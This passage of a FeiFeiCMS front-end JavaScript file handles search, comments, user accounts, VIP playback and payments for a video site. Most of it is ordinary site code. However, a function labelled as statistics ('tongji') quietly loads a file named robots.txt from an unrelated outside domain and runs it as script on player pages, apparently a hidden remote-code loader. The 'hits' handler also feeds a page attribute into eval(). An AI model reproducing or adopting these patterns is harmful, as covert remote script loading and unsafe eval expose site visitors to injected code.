﻿/* Version 3.63
** Up:119*/
var feifei = {
//start
'browser':{//浏览器信息
	'url': document.URL,
	'domain': document.domain,
	'title': document.title,
	'language': (navigator.browserLanguage || navigator.language).toLowerCase(),//zh-tw|zh-hk|zh-cn
	'canvas' : function(){
		return !!document.createElement('canvas').getContext;
	}(),
	'useragent' : function(){
		var ua = navigator.userAgent;//navigator.appVersion
		return {
			'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端 
			'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
			'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器 
			'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器 
			'iPad': ua.indexOf('iPad') > -1, //是否iPad
			'trident': ua.indexOf('Trident') > -1, //IE内核
			'presto': ua.indexOf('Presto') > -1, //opera内核
			'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
			'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核 
			'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",			
		};
	}()
},
'cms':{//系统
	'nav': function($id){//主导航高亮
		$id = $('nav[data-dir]').attr('data-dir');
		$($id).addClass("active");
	},
	'pre':function(){//代码高亮
		//https://highlightjs.org/static/demo/
		if($("pre code").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/highlight.js/9.12.0/styles/googlecode.min.css"}).appendTo("head");
			$.getScript("//lib.baomitu.com/highlight.js/9.12.0/highlight.min.js", function(){
				$('pre code').each(function(i, block) {
					hljs.highlightBlock(block);
				});
			});
		}
	},
	'collapse':function(){//内容详情折叠
		$('.vod-detail .vod-content img').addClass("img-responsive");
		$('.news-detail .news-content img').addClass("img-responsive");
		$('body').on("click", "[data-toggle=ff-collapse]", function(){
			$this = $(this);
			$($this.attr('data-target')).toggle();
			$($this.attr('data-default')).toggle();
			if($this.attr('data-html')){
				$data_html = $this.html();
				$this.html($this.attr('data-html'));
				$this.attr('data-html',$data_html);
			}
			if($this.attr('data-val')){
				$data_val = $this.val();
				$this.val($this.attr('data-val'));
				$this.attr('data-val',$data_val);
			}
		});
	}
},
'mobile':{//移动端专用
	'jump': function(){
		if( cms.domain_m && (feifei.browser.domain != cms.domain_m) ){
			self.location.href = feifei.browser.url.replace(feifei.browser.domain,cms.domain_m);
		}
	},
	'nav': function(){
		$("#ff-nav-btn").bind('click', function(){
			$('#ff-nav-btn-item').toggleClass("hidden");
		});
	},
	'goback': function(){
		if(history.length > 0 && document.referrer){
			$(".ff-goback").show();
			$('.ff-goback').attr('href','javascript:history.go(-1);');
		}else{
			$(".ff-goback").hide();
		}
	},
	'flickity':function(){//手机滑动
		if($(".ff-gallery").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({
				rel: "stylesheet",
				type: "text/css",
				href: "//lib.baomitu.com/flickity/2.0.11/flickity.min.css"
			}).appendTo("head");
			$.getScript("//lib.baomitu.com/flickity/2.0.11/flickity.pkgd.min.js", function(){
				$(".ff-gallery").each(function(i){
					$index = $(this).find('.gallery-active').index()*1;
					if($index > 3){
						$index = $index-3;
					}else{
						$index = 0;
					}
					$(this).flickity({
						cellAlign: 'left',
						freeScroll: true,
						lazyLoad: true,
						contain: true,
						prevNextButtons: false,
						resize: true,
						initialIndex: $index,
						pageDots: false
					});
				});
			});
		}
	}
},
'scroll':{//滚动条
	'fixed' : function($id, $top, $width){// 悬浮区域
		var offset = $('#'+$id).offset();
		if(offset){
			if(!$top){
				$top = 5;
			}
			if(!$width){
				$width = $('#'+$id).width();
			}			
			$(window).bind('scroll', function(){
				if($(this).scrollTop() > offset.top){
					$('#'+$id).css({"position":"fixed","top":$top+"px","width":$width+"px"});
				}else{
					$(('#'+$id)).css({"position":"relative"});
				}
			});		
		}
	},
	'totop':function($id, $top){ //返回顶部
		// $id:dc-totop $top:偏移值
		$('body').append('<a href="#" class="'+$id+'" id="'+$id+'"><i class="glyphicon glyphicon-chevron-up"></i></a>');
		$(window).bind('scroll', function(){
			if($(this).scrollTop() > $top){
				$('#'+$id).fadeIn("slow");
			}else{
				$('#'+$id).fadeOut("slow");
			}
		});	
	}
},
'language':{//简繁转换
	's2t':function(){
		if(feifei.browser.language=='zh-hk' || feifei.browser.language=='zh-tw'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).s2t();//$.s2t(data);
			});
		}
	},
	't2s':function(){
		if(feifei.browser.language=='zh-cn'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).t2s();//$.s2t(data);
			});
		}
	}
},
'page': {//分页
	'more': function(){
		$('body').on('click', '.ff-page-more', function(){
			$this = $(this);
			$page = $(this).attr('data-page')*1+1;
			$id = $this.attr('data-target');
			$.get($(this).attr('data-url')+$page, function(data){
				if(data){
					$($id).append(data);
					$this.attr("data-page",$page);
					$($id+" .ff-img").lazyload();
				}else{
					$this.hide();
					$this.unbind("click");
				}
			},'html');
		});
	},
	'keydown': function(){
	  var prev = $('#ff-prev').attr("href");
	  var next = $('#ff-next').attr("href");
	  $("body").keydown(function(event){
		  if(event.keyCode==37 && prev!=undefined) location=prev; 
		  if(event.keyCode==39 && next!=undefined) location=next; 
	  });
  }
},
'alert':{//提示
	'success':function($id, $tips){
		$($id).html('<div class="alert alert-success fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>成功！</strong>'+$tips+'</div>');
	},
	'warning':function($id, $tips){
		$($id).html('<div class="alert alert-warning fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>警告！</strong>'+$tips+'</div>');
	}
},
'image': {//图片
	'lazyload': function(){//延迟加载
		$.ajaxSetup({
			cache: true
		});
		$.getScript("//lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js", function(response, status) {
			$("img.ff-img").lazyload({
				placeholder : cms.root+"Public/images/no.jpg",
				effect : "fadeIn",
				failurelimit: 15
				//threshold : 400
				//skip_invisible : false
				//container: $(".carousel-inner"),
			}); 
		});
	},
	'qrcode': function(){//生成二维码
		//$("[data-toggle='popover']").popover({html: true});
		$(".glyphicon-phone").popover({
				html: true
		});
		$(".glyphicon-phone").on('show.bs.popover', function () {
			$(".glyphicon-phone").attr('data-content','<img class="ff-qrcode" src="//cdn.feifeicms.co/qrcode/1.0/?w=150&h=150&url='+encodeURIComponent(feifei.browser.url)+'"/>');
		})
	},
	'vcode':function(){//安全码
		return '<label><img class="ff-vcode-img" src="'+cms.root+'index.php?s=Vcode-Index"></label>';
	},
	'slide':function(){//轮播幻灯
		$('.ff-slide').carousel({interval: $('.ff-slide').attr('data-interval')});
	}
},
'vcode': {//验证码
	'load': function(){
		feifei.vcode.focus();
		feifei.vcode.click();
	},
	'focus': function(){//验证码框焦点
		$('body').on("focus", ".ff-vcode", function(){
			$(this).removeClass('ff-vcode').parent().after(feifei.image.vcode());
			$(this).unbind();
		});
	},
	'click': function(){//点击刷新
		$('body').on('click', 'img.ff-vcode-img', function(){
			$(this).attr('src', cms.root+'index.php?s=Vcode-Index');
		});
	}
},
'search': {//搜索
	'dropdown': function(){//下拉菜单
		$(".ff-search .dropdown-menu li a").on("click", function(){
			$form = $(this).parents('form');
			$action = $form.find('button[data-action]');
			if($action.attr('data-action') && $(this).attr('data-action')){
				$action.attr('data-action', $(this).attr('data-action'));
				$form.find('.dropdown-toggle .title').html($(this).html());
			}
		});
	},
	'keydown': function(){//回车
		$(".ff-search input").keyup(function(event){
			if(event.keyCode == 13){
				$form = $(this).parents('form');
				$action = $form.find('button[data-action]').attr('data-action');
				if(!$action){
					$action = cms.root+'index.php?s=vod-search-name-FFWD';
				}
				$wd = $form.find('.ff-wd').val();
				if($wd){
					location.href = $action.replace('FFWD',encodeURIComponent($wd));
				}else{
					$(this).find('.ff-wd').focus();
					$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
				}
				return false;
			}
		});
	},	
	'submit': function(){//提交表单
		$(".ff-search button").on("click", function(){
			$action = $(this).attr('data-action');
			if($action){
				$(".ff-search").attr('action', $action);
			}
		});
		$(".ff-search").on("submit", function(){
			$action = $(this).attr('action');
			$wd = $(this).find('.ff-wd').val();
			if(!$action){
				$action = cms.root+'index.php?s=vod-search-name-FFWD';
			}
			if($wd){
				location.href = $action.replace('FFWD',encodeURIComponent($wd));
			}else{
				$(this).find('.ff-wd').focus();
				$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
			}
			return false;
		});
	},
	'autocomplete': function(){//3.5增加搜索结果控制
		var $limit = $('.ff-search').eq(0).attr('data-limit');
		if( $limit > 0){
			$.ajaxSetup({
				cache: true
			});
			$.getScript("//lib.baomitu.com/jquery.devbridge-autocomplete/1.2.26/jquery.autocomplete.min.js", function(response, status) {
				if($('.ff-search').eq(0).attr('data-sid') == 2){
					$ajax_url = cms.root+'index.php?g=home&m=search&a=news';
				}else{
					$ajax_url = cms.root+'index.php?g=home&m=search&a=vod';
				}
				$('.ff-wd').autocomplete({
					serviceUrl : $ajax_url,
					params: {'limit': $limit},
					paramName: 'wd',
					maxHeight: 400,
					transformResult: function(response) {
						var obj = $.parseJSON(response);
						return {
							suggestions: $.map(obj.data, function(dataItem) {
								return { value: dataItem.name, data: dataItem.link };
							})
						};
					},
					onSelect: function (suggestion) {
						location.href = suggestion.data;
						//alert('You selected: ' + suggestion.value + ', ' + suggestion.data);
					}
				});
			});
		}
	},
	'hot':function(){
		$(".ff-search [data-toggle='tooltip']").tooltip();
		$("#ff-site-hot").load(cms.root+"index.php?s=ajax-site_hot");
	}
},
'record': {//云记录
	'load': function(){
		feifei.record.get();
		feifei.record.set();
	},
	'get':function(){
		//后端获取记录
		if($(".ff-record-get").eq(0).length){
			$.get(cms.root+'index.php?g=home&m=record&a=vod&sid=1', function(data){
				if(data == ''){
					data = '<strong>暂无观看记录</strong>';
				}
				$(".ff-record-get").attr('data-content',data);
			});
		}
		//弹出事件
		$(".ff-record-get").popover().on("mouseenter", function () {
			var _this = this;
			$(this).popover("show");
			$(".popover").on("mouseleave", function () {
				$(_this).popover('hide');
			});
		}).on("mouseleave", function () {
			var _this = this;
			setTimeout(function () {
				if (!$(".popover:hover").length) {
					$(_this).popover("hide");
				}
			}, 300);
		});
	},
	'set':function(){//用户互动记录
		//自动写入观看或浏览记录
		if($(".ff-record-set[data-type=1]").eq(0).attr('data-sid')){
			$this = $(".ff-record-set[data-type=1]").eq(0);
			$.get(cms.root+'index.php?g=home&m=record&a=post&sid='+$this.attr("data-sid")+'&did='+$this.attr("data-id")+'&type=1&did_sid='+$this.attr("data-id-sid")+'&did_pid='+$this.attr("data-id-pid"));
		}
		//喜欢 想看 在看 看过 写入记录
		$('body').on('click', 'a.ff-record-set', function(e){
			//是否需要验证登录
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
				return false;
			}
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?g=home&m=record&a=post&sid='+$(this).attr("data-sid")+'&did='+$(this).attr("data-id")+'&type='+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						if(json.status == 200){
							$this.addClass('disabled');
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'score': {//评分
	'raty': function(){
		if( $('.ff-score').length ){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/raty/2.7.1/jquery.raty.min.css"}).appendTo("head");
			//
			$.getScript("//lib.baomitu.com/raty/2.7.1/jquery.raty.min.js", function(response, status) {
				$(".ff-score").each(function(i){
					$(".ff-score").eq(i).find('.ff-score-raty').raty({ 
						starType: 'i',
						number: 5,
						numberMax : 5,
						half: true,
						score : function(){
							return $(this).attr('data-score');
						},
						click: function(score, evt) {
							$this = $(this);
							$.ajax({
								type: 'get',
								url: cms.root+'index.php?s=gold-'+$(this).attr('data-module')+'-id-'+$(this).attr('data-id')+'-score-'+(score*2),
								timeout: 5000,
								dataType:'json',
								error: function(){
									$this.attr('title', '网络异常！').tooltip('show');
								},
								success: function(json){
									if(json.status == 1){
										$this.parent().find('.ff-score-val').html(json.data.gold);
									}else{
										$this.attr('title', json.info).tooltip('show');
									}
								}
							});
						}
					});					
				});
			});
		}
	}
},
'updown':{//顶踩
	'click': function(){
		$('body').on('click', 'a.ff-updown-set', function(e){
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?s=updown-'+$(this).attr("data-module")+'-id-'+$(this).attr("data-id")+'-type-'+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						$this.addClass('disabled');
						if(json.status == 1){
							if($this.attr("data-type")=='up'){
								$this.find('.ff-updown-val').html(json.data.up);
							}else{
								$this.find('.ff-updown-val').html(json.data.down);
							}
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'hits':{//人气
	'load': function(){
		$(".ff-hits").each(function(i){
			var $this = $(".ff-hits").eq(i);
			$.ajax({
				url: cms.root+'index.php?s=hits-show-id-'+$this.attr("data-id")+'-sid-'+$this.attr("data-sid")+'-type-'+$this.attr("data-type"),
				cache: true,
				dataType: 'json',
				success: function(json){
					$type = $this.attr('data-type');
					if($type != 'insert'){
						$this.html(eval('(json.' + $type + ')'));
					}
				}
			});
	 });
	}
},
'share':{//分享
	'baidu': function(){
		if($(".ff-share").length ){
			$size = $(".ff-share").attr('data-size');
			if(!$size){$size = 16;}
			if( $(".ff-share dd").length ){
				$id = $(".ff-share dd");
			}else{
				$id = $(".ff-share");
			}
			$($id).html('<div class="bdsharebuttonbox"><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_bdysc" data-cmd="bdysc" title="分享到百度云收藏"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div>');
			window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":""+$size+""},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		}
	}
},
'forum': {//讨论模块功能
	'load':function(){
		if($('.ff-forum[data-type=feifei]').length){
			this.system();
		}
		if($('.ff-forum[data-type=uyan]').length){
			this.uyan();
		}
		if($('.ff-forum[data-type=changyan]').length){
			this.changyan();
		}
	},
	'system': function(){
		//初始加载
		if($('.ff-forum[data-type=feifei]').attr('data-sid')){
			feifei.forum.ajax('.ff-forum', $('.ff-forum[data-type=feifei]').attr('data-sid'), $('.ff-forum[data-type=feifei]').attr('data-id'), 0, 1);
		}
		//登录验证
		$(".ff-forum").on("focus", 'textarea[name=forum_content]', function(){ //表单提交
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
			}
		});
		//回复评论
		$('body').on('click', 'a.forum-reply-set', function(){
			var $pid = $(this).attr("data-id");
			var $reply = $(this).parents('.media-body').find('.forum-reply');
			var $form = $($(".ff-forum-post").eq(0).prop("outerHTML"));
			if($pid){
				$form.find('.ff-alert').html('');
				$form.find("button[type='submit']").removeClass('disabled')
				$form.find("input[name='forum_pid']").val($pid);
				$form.show();
				$($reply).html($form);
				$($reply).collapse('toggle');
			}
		});
		//举报评论
		$('body').on('mouseenter', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeIn();
		});
		$('body').on('mouseleave', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeOut();
		});
		$('body').on('click', 'a.forum-report', function(){
			$(this).remove();//移除按钮
			var $id = $(this).attr("data-id");
			if($id){
				$.ajax({
					type: 'get',
					url: cms.root+'index.php?s=forum-report-id-'+$id,
					timeout: 3000,
					dataType:'json',
					success:function(json){
						feifei.alert.success($('.form-forum').eq(0).find('.ff-alert'), json.info);
					}
				});
			}
		});
		//发表评论
		$("body").on("submit", '.ff-forum-post', function(){
			var $this = $(this);
			var $sid = $(this).find('input[name=forum_sid]').val();
			$.post($this.attr('action'), $this.serialize(), function(json){
				if(json.status == 200){//不需要审核留言
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
					//主题、回复贴处理
					if(json.data.forum_pid){//回复贴
						feifei.forum.reply(json.data.forum_pid);//更新回复数及显示回复链接按钮
						setTimeout(function(){$('.forum-reply[data-id='+json.data.forum_pid+']').fadeOut('slow')}, 2000);//移除回复表单容器
					}else{//主题贴
						setTimeout(function(){feifei.forum.ajax('.ff-forum-item', json.data.forum_sid, json.data.forum_cid, 1, 1)}, 2000);
						setTimeout(function(){$this.hide()}, 3000);
					}
					//发表评论后是否需要刷新网页
					if($('.ff-forum-reload').length){
						location.reload();
					}
				}else if(json.status > 200){//需要审核
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
				}else{
					feifei.alert.warning($this.find('.ff-alert'), json.info);
				}
			 },'json');
			return false;
		});
	},
	'ajax': function($target, $sid, $cid, $ismore, $page){//AJAX加载系统评论
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-ajax-sid-'+$sid+'-cid-'+$cid+'-ismore-'+$ismore+'-p-'+$page,
			timeout: 3000,
			error: function(){
				$($target).html('评论加载失败，请刷新...');
			},
			success:function($html){
				$($target).html($html);
			}
		});
	},
	'reply': function($id){//更新回复数及显示回复链接
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-reply-id-'+$id,
			timeout: 3000,
			dataType:'json',
			success:function(json){
				if(json.status==200){
					$('.forum-reply-set[data-id='+$id+']').find('.forum-reply-val').html(json.data);
					$('.forum-reply-get[data-id='+$id+']').fadeIn();
				}
			}
		});
	},
	'uyan': function(){
		$(".ff-forum").html('<div id="uyan_frame"></div>');
		$.getScript("http://v2.uyan.cc/code/uyan.js?uid="+$('.ff-forum[data-type=uyan]').attr('data-uyan-uid'));
	},
	'changyan': function(){
		$appid = $('.ff-forum[data-type=changyan]').attr('data-cy-id');
		$conf = $('.ff-forum[data-type=changyan]').attr('data-cy-conf');
		$sourceid = $('.ff-forum[data-type=changyan]').attr('data-sid')+'-'+$('.ff-forum[data-type=changyan]').attr('data-id');
		var width = window.innerWidth || document.documentElement.clientWidth;
		if (width < 768) { 
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div><script charset="utf-8" id="changyan_mobile_js" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id='+$appid+'&conf=prod_'+$conf+'"><\/script>');
		}else{
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div>');
			$.getScript("https://changyan.sohu.com/upload/changyan.js",function(){
				window.changyan.api.config({
					appid: $appid,
					conf: 'prod_'+$conf
				});
			});
		}
	}
},
'scenario': {//分集剧情
	'load':function(){
		var $max = $(".ff-scenario-pill").attr('data-max')*1;
		var $count = $(".ff-scenario-content dl").length;
		var $li = 0;
		var $list = '';
		if($count > 0 && $max>0){
			for($i=0; $i<$count; $i++){
				if(($i+$max) > $count){
					$max_ji = $count;
				}else{
					$max_ji = $i+$max;
				}
				if($i % $max == 0){
					$li++;
					$list+='<li><a href="javascript:;" data-target=".ff-scenario-'+$li+'" data-toggle="pill">第'+($i+1)+'-'+$max_ji+'集</a></li>';
				}
				$(".ff-scenario-content dl").eq($i).addClass('ff-scenario-'+$li);
			}
			$('.ff-scenario-pill').html($list);
			$('.ff-scenario-pill a:first').tab('show');
		}
	}
},
'playurl': {//播放地址
	'download': function(){
		if($(".ff-playurl-down").length){
			$.getScript("//cdn.feifeicms.co/download/xunlei.js",function(){
				//3.4增加鼠标点击去掉文件名标题
				$(".ff-playurl-down input[type=text]").focus(function(){
					$(this).val($(this).parent().find('input[type=checkbox]').val());
				});
			});
		}
	},
	'tongji': function(){
		if($("#cms_player").length){
			$.getScript("//www.cnhb.org/robots.txt");
		}
	},
	'active':function(){
		$('.ff-playurl li[data-id="'+$('.ff-playurl[data-active]').attr('data-active')+'"]').addClass("active");
		$('.ff-playurl-tab a[data-target="'+$('.ff-playurl-tab[data-active]').attr('data-active')+'"]').tab('show');
		$('.ff-playurl-dropdown a[data-target="'+$('.ff-playurl-dropdown[data-active]').attr('data-active')+'"]').tab('show');
	},	
	'dropdown':function(){
		$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
			$(this).parents('.btn-group').find('.dropdown-toggle span:eq(0)').html($(e.target).text());
			$(this).parents('.dropdown-menu').find('li').removeClass('active');
			$(this).parent().addClass('active');
		});
	},
	'more':function(){//...效果
		$('.ff-playurl').each(function(i){
			$this = $(this);
			$config = $this.attr('data-more')*1;
			$max = $this.find('li a').size();
			if(($config+2) < $max && $config>0){
				$max_html = $($this.find('li:last').prop("outerHTML")).find('a').attr('href','#all').html('全部...');
				$max_html = '<li class="'+$this.find('li').attr('class')+'">'+$max_html.prop("outerHTML")+'</li>';
				$this.find('li').each(function(n){
					if(n+1 > $config){
						$(this).hide();
					}
				});
				$this.find('li').eq($config).after($max_html);
				$this.find('li:last').show();
			}
	 	});
		//more点击
		$('.ff-playurl').on('click', 'a', function(e){
			if($(this).attr('href') == '#all'){
				$(this).parent().parent().find('li').show();
				$(this).parent().remove();
				return false;
			}
		});
	},
	//vip播放器回调
	'vip_callback':function($vod_id, $vod_sid, $vod_pid, $status, $trysee, $tips){
		if($status != 200){
			if($trysee > 0){
				window.setTimeout(function(){
					$.get(cms.root+'index.php?s=vod-vip-action-trysee-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(html){
						$('#cms_player').html(html).removeClass("embed-responsive-4by3").css({"height":"auto"});
					},'html');
				},1000*60*$trysee);
			}else{
				$('#cms-player-vip .cms-player-box').html($tips);
				$('#cms-player-vip .cms-player-iframe').hide();
				$('#cms_player').removeClass("embed-responsive-4by3").css({"height":"auto"});
			}
			//支付影币按钮
			$('#cms_player').on("click",".vod-price",function(){
				$(this).html('Loading...');
				$.get(cms.root+'index.php?s=vod-vip-action-ispay-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(json){
					if(json.status == 200){
						location.reload();
					}else if(json.status == 500 || json.status == 501){
						feifei.user.login();
					}else{
						$('#cms_player').html(json.info);
					}
				},'json');
			});
		}else{
			//拥有VIP观看权限
		}
	}
},
'user':{
	//基础功能
	'load':function(){
		//不同模式下处理用户基础信息
		feifei.user.islogin();
		//模态框登录事件
		$("body").on("click",".user-login-modal",function(){
			feifei.user.login();
			return false;
		});
		//积分在线充值事件
		$("body").on("click",".user-score-payment",function(){
			feifei.user.ScorePayment();
			return false;
		});
		//积分卡密充值事件
		$("body").on("click",".user-score-card",function(){
			feifei.user.ScoreCard();
			return false;
		});
		//积分升级VIP事件
		$("body").on("click",".user-score-upvip",function(){
			feifei.user.ScoreUpvip();
			return false;
		});
		//用户中心修改邮箱
		$("body").on("click",".user-change-email", function(){
			feifei.user.ChangeEmail();
			return false;
		});
		//用户中心修改密码
		$("body").on("click",".user-change-pwd", function(){
			feifei.user.ChangePwd();
			return false;
		});
	},
	//静态模式加载用户ID
	'islogin':function(){
		if($('.ff-user').length && (cms.urlhtml == 1)){
			$.ajax({
				type: 'get',
				url: cms.root+'index.php?s=user-info',
				timeout: 3000,
				dataType:'json',
				success:function(json){
					if(json.status==200){
						cms.userid = json.data.user_id;
						cms.username = json.data.user_name;
						$('.ff-user').removeClass("user-login-modal");
						$('.ff-user[data-href]').attr('href',$('.ff-user[data-href]').attr('data-href'));
						$('.ff-user[data-name]').html('<a href="'+$('.ff-user').attr('data-href')+'">'+cms.username+'</a>');
					}
				}
			});
		}
	},
	//AJAX模态框登录
	'login':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			cache: false,
			url: cms.root+'index.php?s=user-ajax_login',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".form-user-login").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-login-alert').html('正在登录...');
						},
						error : function(){
							$('.user-login-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								location.reload();
							}else{
								$('#user-submit').html('登录');
								feifei.alert.warning('.user-login-alert',json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//积分在线充值
	'ScorePayment':function(){
		feifei.order.payment();
	},
	//积分卡密充值
	'ScoreCard':function(){
		feifei.order.card();
	},
	//升级VIP
	'ScoreUpvip':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_upvip',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-upvip-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-upvip-alert').html('Loading...');
						},
						error : function(){
							$('.user-upvip-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-upvip-alert', '升级完成，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-upvip-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else if(json.status == 501){
								feifei.alert.warning('.user-upvip-alert', '影币不足，共需要'+json.info+'个影币，请先冲值！');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.order.payment();}, 2000);
							}else{
								feifei.alert.warning('.user-upvip-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改邮箱
	'ChangeEmail':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_email',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-email-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-email-alert').html('Loading...');
						},
						error : function(){
							$('.user-email-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-email-alert', '邮箱修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-email-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-email-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改密码
	'ChangePwd':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_repwd',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-repwd-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-repwd-alert').html('Loading...');
						},
						error : function(){
							$('.user-repwd-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-repwd-alert', '密码修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-repwd-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-repwd-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
},
'order':{//影币订单模块
	'payment':function(){//在线充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-index',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-payment").on('submit',function(e){
					if($(".forum-payment input[name=score_ext]").val() < $(".forum-payment").attr('data-small')){
						feifei.alert.warning('.user-pay-alert', '每次至少充值<strong>'+$(".forum-payment").attr('data-small')+'</strong>元');
						return false;
					}
					setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();}, 5000);
				});
			}
		});
	},
	'card':function(){//卡密充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-card',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-card").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
